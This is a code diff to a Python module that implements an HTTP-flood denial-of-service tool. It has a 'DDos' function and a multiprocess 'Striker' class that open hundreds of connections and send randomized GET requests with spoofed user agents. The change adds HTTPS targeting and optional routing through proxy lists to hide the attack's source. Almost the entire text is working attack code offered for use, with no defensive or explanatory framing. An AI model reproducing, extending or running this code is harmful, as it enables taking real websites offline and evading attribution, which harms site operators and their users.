@@ -1,11 +1,16 @@
 from random import randint, shuffle, choice, random
-from http.client import HTTPConnection
+from http.client import HTTPConnection, HTTPSConnection
 from re import compile, match
 proxies, USER_AGENT_PARTS = open(__file__.replace('__init__.py', 'proxies.txt')).readlines(), {'os': {'linux': {'name': ['Linux x86_64', 'Linux i386'], 'ext': ['X11']}, 'windows': {'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'], 'ext': ['WOW64', 'Win64; x64']}, 'mac': {'name': ['Macintosh'], 'ext': ['Intel Mac OS X %d_%d_%d' % (randint(10, 11), randint(0, 9), randint(0, 5)) for i in range(1, 10)]}}, 'platform': {'webkit': {'name': ['AppleWebKit/%d.%d' % (randint(535, 537), randint(1,36)) for i in range(1, 30)], 'details': ['KHTML, like Gecko'], 'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (randint(6, 32), randint(100, 2000), randint(0, 100), randint(535, 537), randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (randint(4, 6), randint(0, 1), randint(0, 9), randint(535, 537), randint(1, 36)) for i in range(1, 10)]}, 'iexplorer': {'browser_info': {'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'], 'ext_pre': ['compatible', 'Windows; U'], 'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (randint(1, 3), randint(0, 5), randint(1000, 30000)) for i in range(1, 10)]}}, 'gecko': {'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (randint(2001, 2010), randint(1,31), randint(1,12) , randint(10, 25)) for i in range(1, 30)], 'details': [], 'extensions': []}}}
 def checkUrl(url): return bool(match(compile(r'^(?:http)s?://(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?))', 2), url))
-def DDos(url: str, sockets = 500, threads = 10):
+def checkProxy(proxy): return bool(match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$', proxy))
+def DDos(url: str, sockets = 500, threads = 10, use_proxies = False, custom_proxies = None):
+    global proxies
     assert checkUrl(url)
-    workersQueue = [Striker(url, sockets, not i, threads) for i in range(threads)]
+    if custom_proxies:
+        for proxy in custom_proxies: assert checkProxy(proxy)
+        proxies = custom_proxies
+    workersQueue = [Striker(url, sockets, not i, threads, use_proxies) for i in range(threads)]
     for worker in workersQueue: worker.start()
     while workersQueue:
         try:
@@ -16,20 +21,20 @@ def DDos(url: str, sockets = 500, threads = 10):
             for worker in workersQueue: worker.stop()
     print()
 class Striker(__import__('multiprocessing').Process):
-    def __init__(self, url, sockets, printer, threads):
+    def __init__(self, url, sockets, printer, threads, use_proxies):
         super(Striker, self).__init__()
-        self.packets, self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl, self.printer, self.threads = [0, 0], [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https'), printer, threads
+        self.packets, self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl, self.printer, self.threads, self.use_proxies = [0, 0], [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https'), printer, threads, use_proxies
     def __del__(self): self.stop()
     def run(self):
         while self.runnable:
             try:
-                for i in range(self.sockets): self.socks.append(HTTPConnection(choice(proxies)[:-1]))
+                for i in range(self.sockets): self.socks.append(HTTPConnection(choice(proxies).replace("\n", "")) if self.use_proxies else (HTTPSConnection(self.host) if self.ssl else HTTPConnection(self.host)))
                 for conn_req in self.socks:
                     url, r_headers = self.generateData()
                     random_keys, headers = list(r_headers.keys()), {}
                     shuffle(random_keys)
                     for header_name in random_keys: headers[header_name] = r_headers[header_name]
-                    conn_req.request("GET", ("https://" if self.ssl else "http://") + self.host + self.url, None, headers)
+                    conn_req.request("GET", (("https://" if self.ssl else "http://") + self.host + self.url) if self.use_proxies else url, None, headers)
                 for conn_resp in self.socks:
                     conn_resp.getresponse()
                     self.packets[0] += 1
